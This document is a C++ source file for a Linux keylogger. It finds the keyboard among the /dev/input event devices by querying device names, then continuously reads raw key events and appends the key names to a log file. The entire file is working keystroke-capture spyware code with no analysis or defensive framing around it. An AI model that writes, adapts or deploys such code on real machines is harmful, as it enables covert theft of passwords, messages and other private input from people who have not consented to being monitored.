#include "Keylogger.hpp"
#include <iostream>
#include <dirent.h>
#include <filesystem>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <fstream>
#include "../constants.hpp"
#include <regex>
#include <cstdlib>

kl::Keylogger::~Keylogger()
{
}

kl::Keylogger::Keylogger(std::string output, bool debug, std::vector<std::string> inputDir)
    : _outputPath(output), _debug(debug)
{
    if (_debug)
    {
        std::cout << "Starting program at " << std::filesystem::current_path().c_str() << std::endl;
        std::cout << "Output path : " << _outputPath << std::endl;
    }
    if (_debug)
        std::cout << "_findInputFile ->" << std::endl;
    _findInputFile(inputDir);
}

static int selector(const struct dirent *files)
{
    return !std::string{files->d_name}.compare(0, 5, "event");
}

void kl::Keylogger::start()
{
    _spy = std::async(std::launch::async, &kl::Keylogger::readEvent, this);
    _spy.wait();
}

void kl::Keylogger::readEvent()
{
    std::ofstream output {_outputPath, std::ios::app};
    int fd {open(_input.c_str(), O_RDONLY)};
    struct input_event *event = new input_event[32];

    while (1) {
        if (read(fd, event, sizeof(*event) * 32) < 1)
            continue;
        output << keys[event[1].code] << std::endl;
    }
}

void kl::Keylogger::_findInputFile(const std::vector<std::string> &dirList)
{
    struct dirent **files;
    int nbFile{0};
    int fd{0};
    char *infos{new char[256]};
    for (std::string dir : dirList)
    {
        nbFile = scandir(dir.c_str(), &files, &selector, &versionsort);
        for (int i = 0; i < nbFile; i++)
        {
            if ((fd = open(std::string{dir + "/" + files[i]->d_name}.c_str(), O_RDONLY)) < 0)
            {
                perror("open");
                continue;
            }
            ioctl(fd, EVIOCGNAME(256), infos);
            close(fd);
            if (std::regex_match(infos, std::regex{".*[Kk]eyboard.*"}))
            {
                _input = dir + "/" + files[i]->d_name;
                if (_debug)
                    std::cout << "\tinput:" << _input << std::endl;
                break;
            }
        }
        delete (files);
    }
}
